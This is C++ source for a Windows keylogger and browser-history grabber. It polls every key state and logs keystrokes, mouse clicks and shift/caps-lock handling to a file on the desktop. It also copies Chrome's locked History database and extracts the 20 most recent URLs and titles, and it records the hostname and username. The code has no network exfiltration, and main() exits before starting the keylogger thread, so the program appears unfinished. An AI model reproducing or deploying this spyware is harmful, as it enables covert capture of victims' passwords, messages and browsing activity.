#include <iostream>
#include <windows.h>
#include <fstream>
#include <sys/stat.h>
#include "sqlite/sqlite3.h"
#include <cstdlib>
#include <winsock.h>
#include <thread>
#include <time.h>



using namespace std;
#define INFO_BUFFER_SIZE 100

bool capslock_pressed = false;
// string g_key_press_logfile = "C:\\Users\\ravin\\Desktop\\key.log";
// string g_chrome_history_logfile = "C:\\Users\\ravin\\Desktop\\chrome_history.log";
string g_key_press_logfile;
string g_chrome_history_logfile;
string g_hostname;
string g_username;

bool file_exists(string filename) {
    std::string const temp{filename};
    const char* dir = temp.c_str();;
    struct stat info;
    if( stat(dir, &info ) != 0 )
        return false;
    return true;
}


void save_in_file(string filename, string msg) {
    ofstream myfile;
    myfile.open(filename, ios_base::app);
    myfile << msg ;
    myfile.close();
}


void format_keys(int key_num, string key_opt_1, string key_opt_2) {
    string printed_string;

    // Getting stats of current key press
    bool isAlpha = (key_num >= 65 and key_num <= 90) ? true : false;
    bool isAlphaNumeric =  ((key_num >= 48 and key_num <= 57) || isAlpha) ? true : false;
    bool isGrammer =  ((key_num == 32) || (key_num >= 186 and key_num <= 226) || isAlphaNumeric) ? true : false;

    // Changing key press value depending upon shift and caps lock state
    bool shift_pressed = ((GetKeyState( VK_SHIFT ) & 0x8000) != 0) ? true : false;
    bool cl_pressed = ((GetKeyState( VK_CAPITAL ) & 0x8000) != 0) ? true : false;
    
    // Changing capslock's current state based on current capslock key press
    if (cl_pressed) capslock_pressed = (capslock_pressed) ? false : true;
    
    if (isAlpha and capslock_pressed) shift_pressed = true;
    printed_string = (shift_pressed) ? key_opt_2 : key_opt_1;
    
    // Skip printing ship and caps lock key presses
    if (key_num == 16 || key_num == 20) {
        return;
    }

    // Formatting key press value for log file
    printed_string = (isGrammer) ? printed_string : "\n" + printed_string + "\n";
    save_in_file(g_key_press_logfile, printed_string);
}


int detect_key_press() {
    while(1)
    {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                string key_opt_1;
                string key_opt_2;
                // Mapping key press value to human readable states
                if      (i == 1) {key_opt_1 = "<Mouse Left>"; key_opt_2 = "<Mouse Left>";}
                else if (i == 2) {key_opt_1 = "<Mosue Right>"; key_opt_2 = "<Mosue Right>";}  
                else if (i == 3) {key_opt_1 = "<Control-break>"; key_opt_2 = "<Control-break>";} 
                else if (i == 4) {key_opt_1 = "<Mouse Middle>"; key_opt_2 = "<Mouse Middle>";}  
                else if (i == 5) {key_opt_1 = "Mouse Forward Btn"; key_opt_2 = "Mouse Forward Btn";}  
                else if (i == 6) {key_opt_1 = "Mouse Backward Btn"; key_opt_2 = "Mouse Backward Btn";}  
                else if (i == 8) {key_opt_1 = "<BACKSPACE>"; key_opt_2 = "<BACKSPACE>";}  
                else if (i == 9) {key_opt_1 = "<TAB>"; key_opt_2 = "<TAB>";}  
                else if (i == 12) {key_opt_1 = "<CLEAR>"; key_opt_2 = "<CLEAR>";}  
                else if (i == 13) {key_opt_1 = "<ENTER>"; key_opt_2 = "<ENTER>";}  
                else if (i == 16) {key_opt_1 = "<SHIFT>"; key_opt_2 = "<SHIFT>";} 
                else if (i == 17) {key_opt_1 = "<CTRL>"; key_opt_2 = "<CTRL>";}  
                else if (i == 18) {key_opt_1 = "<ALT>"; key_opt_2 = "<ALT>";}  
                else if (i == 19) {key_opt_1 = "<PAUSE>"; key_opt_2 = "<PAUSE>";} 
                else if (i == 20) {key_opt_1 = "<CAPS>"; key_opt_2 = "<CAPS>";}  
                else if (i == 27) {key_opt_1 = "<ESC>"; key_opt_2 = "<ESC>";}  
                else if (i == 32) {key_opt_1 = " "; key_opt_2 = " ";}  
                else if (i == 33) {key_opt_1 = "Page Up"; key_opt_2 = "Page Up";}  
                else if (i == 34) {key_opt_1 = "Page Dow"; key_opt_2 = "Page Dow";}  
                else if (i == 35) {key_opt_1 = "<END>"; key_opt_2 = "<END>";}  
                else if (i == 36) {key_opt_1 = "<HOME>"; key_opt_2 = "<HOME>";} 
                else if (i == 37) {key_opt_1 = "<LEFT>"; key_opt_2 = "<LEFT>";}  
                else if (i == 38) {key_opt_1 = "<UP>"; key_opt_2 = "<UP>";}  
                else if (i == 39) {key_opt_1 = "<RIGHT>"; key_opt_2 = "<RIGHT>";}  
                else if (i == 40) {key_opt_1 = "<DOWN>"; key_opt_2 = "<DOWN>";}  
                else if (i == 41) {key_opt_1 = "<SELECT>"; key_opt_2 = "<SELECT>";}  
                else if (i == 42) {key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>";}  
                else if (i == 43) {key_opt_1 = "<EXECUTE>"; key_opt_2 = "<EXECUTE>";}  
                else if (i == 44) {key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>";} 
                else if (i == 45) {key_opt_1 = "<INS>"; key_opt_2 = "<INS>";} 
                else if (i == 46) {key_opt_1 = "<DEL>"; key_opt_2 = "<DEL>";}
                else if (i == 47) {key_opt_1 = "<HELP>"; key_opt_2 = "<HELP>";}  
                else if (i == 48) {key_opt_1 = "0"; key_opt_2 = ")";}
                else if (i == 49) {key_opt_1 = "1"; key_opt_2 = "!";}
                else if (i == 50) {key_opt_1 = "2"; key_opt_2 = "@";}
                else if (i == 51) {key_opt_1 = "3"; key_opt_2 = "#";}
                else if (i == 52) {key_opt_1 = "4"; key_opt_2 = "$";}
                else if (i == 53) {key_opt_1 = "5"; key_opt_2 = "%";}
                else if (i == 54) {key_opt_1 = "6"; key_opt_2 = "^";}
                else if (i == 55) {key_opt_1 = "7"; key_opt_2 = "&";}
                else if (i == 56) {key_opt_1 = "8"; key_opt_2 = "*";}
                else if (i == 57) {key_opt_1 = "9"; key_opt_2 = "(";}
                else if (i == 65) {key_opt_1 = "a"; key_opt_2 = "A";}
                else if (i == 66) {key_opt_1 = "b"; key_opt_2 = "B";}
                else if (i == 67) {key_opt_1 = "c"; key_opt_2 = "C";}
                else if (i == 68) {key_opt_1 = "d"; key_opt_2 = "D";}
                else if (i == 69) {key_opt_1 = "e"; key_opt_2 = "E";}
                else if (i == 70) {key_opt_1 = "f"; key_opt_2 = "F";}
                else if (i == 71) {key_opt_1 = "g"; key_opt_2 = "G";}
                else if (i == 72) {key_opt_1 = "h"; key_opt_2 = "H";}
                else if (i == 73) {key_opt_1 = "i"; key_opt_2 = "I";}
                else if (i == 74) {key_opt_1 = "j"; key_opt_2 = "J";}
                else if (i == 75) {key_opt_1 = "k"; key_opt_2 = "K";}
                else if (i == 76) {key_opt_1 = "l"; key_opt_2 = "L";}
                else if (i == 77) {key_opt_1 = "m"; key_opt_2 = "M";}
                else if (i == 78) {key_opt_1 = "n"; key_opt_2 = "N";}
                else if (i == 79) {key_opt_1 = "o"; key_opt_2 = "O";}
                else if (i == 80) {key_opt_1 = "p"; key_opt_2 = "P";}
                else if (i == 81) {key_opt_1 = "q"; key_opt_2 = "Q";}
                else if (i == 82) {key_opt_1 = "r"; key_opt_2 = "R";}
                else if (i == 83) {key_opt_1 = "s"; key_opt_2 = "S";}
                else if (i == 84) {key_opt_1 = "t"; key_opt_2 = "T";}
                else if (i == 85) {key_opt_1 = "u"; key_opt_2 = "U";}
                else if (i == 86) {key_opt_1 = "v"; key_opt_2 = "V";}
                else if (i == 87) {key_opt_1 = "w"; key_opt_2 = "W";}
                else if (i == 88) {key_opt_1 = "x"; key_opt_2 = "X";}
                else if (i == 89) {key_opt_1 = "y"; key_opt_2 = "Y";}
                else if (i == 90) {key_opt_1 = "z"; key_opt_2 = "Z";}
                else if (i == 91) {key_opt_1 = "<Left>"; key_opt_2 = "<Left>";}  
                else if (i == 92) {key_opt_1 = "<Right>"; key_opt_2 = "<Right>";} 
                else if (i == 93) {key_opt_1 = "<Applications>"; key_opt_2 = "<Applications>";} 
                else if (i == 94) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";} 
                else if (i == 95) {key_opt_1 = "<Computer>"; key_opt_2 = "<Computer>";} 
                else if (i == 106) {key_opt_1 = "<Multiply>"; key_opt_2 = "<Multiply>";} 
                else if (i == 107) {key_opt_1 = "<Add>"; key_opt_2 = "<Add>";} 
                else if (i == 108) {key_opt_1 = "<Separator>"; key_opt_2 = "<Separator>";} 
                else if (i == 109) {key_opt_1 = "<Subtract>"; key_opt_2 = "<Subtract>";}
                else if (i == 110) {key_opt_1 = "<Decimal>"; key_opt_2 = "<Decimal>";} 
                else if (i == 111) {key_opt_1 = "<Divide>"; key_opt_2 = "<Divide>";} 

                else if (i == 144) printf("<NUM>");
                else if (i == 145) printf("<SCROLL>");
                else if (i == 172) printf("Home");
                else if (i == 173) printf("<Volume Mute>");
                else if (i == 174) printf("<Volume Down>");
                else if (i == 175) printf("<Volume Up>");
                else if (i == 176) printf("<Next>");
                else if (i == 177) printf("<Previous>");
                else if (i == 178) printf("<Stop>");
                else if (i == 179) printf("<Play/Pause>");
                else if (i == 180) printf("<Start>");
                else if (i == 181) printf("<Select>");
                else if (i == 182) printf("<Start>");
                else if (i == 183) printf("<Start>");
                else if (i == 186) {key_opt_1 = ";"; key_opt_2 = ":";} 
                else if (i == 187) {key_opt_1 = "="; key_opt_2 = "+";}  
                else if (i == 188) {key_opt_1 = ","; key_opt_2 = "<";}
                else if (i == 189) {key_opt_1 = "-"; key_opt_2 = "_";} 
                else if (i == 190) {key_opt_1 = "."; key_opt_2 = ">";}
                else if (i == 191) {key_opt_1 = "/"; key_opt_2 = "?";}
                else if (i == 192) {key_opt_1 = "`"; key_opt_2 = "~";}
                else if (i == 219) {key_opt_1 = "["; key_opt_2 = "{";}
                else if (i == 220) {key_opt_1 = "\\"; key_opt_2 = "|";}
                else if (i == 221) {key_opt_1 = "]"; key_opt_2 = "}";}
                else if (i == 222) {key_opt_1 = "\'"; key_opt_2 = "\"";}
                else if (i == 223) {key_opt_1 = "<Used>"; key_opt_2 = "<Used>";}
                else if (i == 224) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";}
                else if (i == 226) {key_opt_1 = ","; key_opt_2 = "<";}
                else if (i == 229) {key_opt_1 = "<IME>"; key_opt_2 = "<IME>";}
                else if (i == 231) {key_opt_1 = "<Used>"; key_opt_2 = "<Used>";}
                else if (i == 246) {key_opt_1 = "<Attn>"; key_opt_2 = "<Attn>";}
                else if (i == 247) {key_opt_1 = "<CrSel>"; key_opt_2 = "<CrSel>";}
                else if (i == 248) {key_opt_1 = "<ExSel>"; key_opt_2 = "<ExSel>";}
                else if (i == 249) {key_opt_1 = "<Erase>"; key_opt_2 = "<Erase>";}
                else if (i == 250) {key_opt_1 = "<Play>"; key_opt_2 = "<Play>";}
                else if (i == 251) {key_opt_1 = "<Zoom>"; key_opt_2 = "<Zoom>";}
                else if (i == 252) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";}
                else if (i == 253) {key_opt_1 = "<PA1>"; key_opt_2 = "<PA1>";}
                else if (i == 254) {key_opt_1 = "<Clear>"; key_opt_2 = "<Clear>";}
                format_keys(i, key_opt_1, key_opt_2);
                // else if (i == 112) printf("<F1>");
                // else if (i == 113) printf("<F2>");
                // else if (i == 114) printf("<F3>");
                // else if (i == 115) printf("<F4>");
                // else if (i == 116) printf("<F5>");SSS
                // else if (i == 117) printf("<F6>");
                // else if (i == 118) printf("<F7>");
                // else if (i == 119) printf("<F8>");
                // else if (i == 120) printf("<F9>");
                // else if (i == 121) printf("<F10>");
                // else if (i == 122) printf("<F11>");
                // else if (i == 123) printf("<F12>");
                // else if (i == 124) printf("<F13>");
                // else if (i == 125) printf("<F14>");
                // else if (i == 126) printf("<F15>");
                // else if (i == 127) printf("<F16>");
                // else if (i == 128) printf("<F17>");
                // else if (i == 129) printf("<F18>");
                // else if (i == 130) printf("<F19>");
                // else if (i == 131) printf("<F20>");
                // else if (i == 132) printf("<F21>");
                // else if (i == 133) printf("<F22>");
                // else if (i == 134) printf("<F23>");
                // else if (i == 135) printf("<F24>");
            } 
        } 
    }
}

static int sql_output_to_file(void *filename, int argc, char **argv, char **azColName){
    ofstream myfile;
    myfile.open((const char*)filename, ios_base::app);

    string output = "";
    for(int i = 0; i < argc; i++){     
       output += (argv[i] ? argv[i] : "NULL");
       output += "\t\t";
    }

    myfile << output + "\n";
    myfile.close();

    return 0;
}


void chrome_interval_check() {
    const clock_t begin_time = clock();
    cout << float( clock () - begin_time ) /  CLOCKS_PER_SEC;
}


bool get_chrome_data() {
    // Getting chrome folder path
    string appdata_path = getenv("APPDATA");
    string chrome_data_folder_path = appdata_path.substr(0,appdata_path.rfind('\\')) + "\\Local\\Google\\Chrome\\User Data\\Default";
    
    if (!file_exists(chrome_data_folder_path))
        return false;

    // Copying chrome history database to new file to bypass database lock
    string original_db = chrome_data_folder_path+ "\\History";
    string copy_db = chrome_data_folder_path+ "\\History2";
    string formatted_cmd = "copy \""+original_db+"\"  \""+copy_db+"\"";
    
    int result = system(formatted_cmd.c_str());
    if (result != 0) {
        cout << "There was an error executing the command." << endl;
        return false;
    }

    // Getting chrome history
    const char* history_path = copy_db.c_str();
    const char* history_log = g_chrome_history_logfile.c_str();
    sqlite3* db; 
    sqlite3_stmt* stmt;
    char *err;
    sqlite3_open(history_path, &db);
    int retval = sqlite3_exec(db, "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS time, title, url FROM urls ORDER BY time DESC LIMIT 20;", sql_output_to_file, (void *)history_log, &err);
    if (retval != SQLITE_OK) {
        cout << "SQL EXEC ERROR" << err << endl;
        return false;
    }

    return true;
}


void get_computer_stats() {
    long unsigned int hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    long unsigned int username_len = 257;
    char hostname[hostname_len];    
    char username[username_len];
    GetComputerNameExA((COMPUTER_NAME_FORMAT)0, hostname, &hostname_len);
    GetUserNameA(username, &username_len);
    g_hostname = string(hostname);
    g_username = string(username);
}


int main() {
    get_computer_stats();
    cout << "Hostname: " << g_hostname << endl;
    cout << "Username: " << g_username << endl;
    g_key_press_logfile = "C:\\Users\\"+g_username+"\\Desktop\\key.log";
    g_chrome_history_logfile = "C:\\Users\\"+g_username+"\\Desktop\\chrome_history.log";

    //get_chrome_data();
    chrome_interval_check();
    return 0;
    thread th1(detect_key_press);

    //detect_key_press();
    // int x = 0;

    // while (true) {
    //     cout << x << endl;
    //     x += 1; 
    //     Sleep(1000);

    // }
}


// "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS time, title, url FROM urls ORDER BY time DESC LIMIT 20;"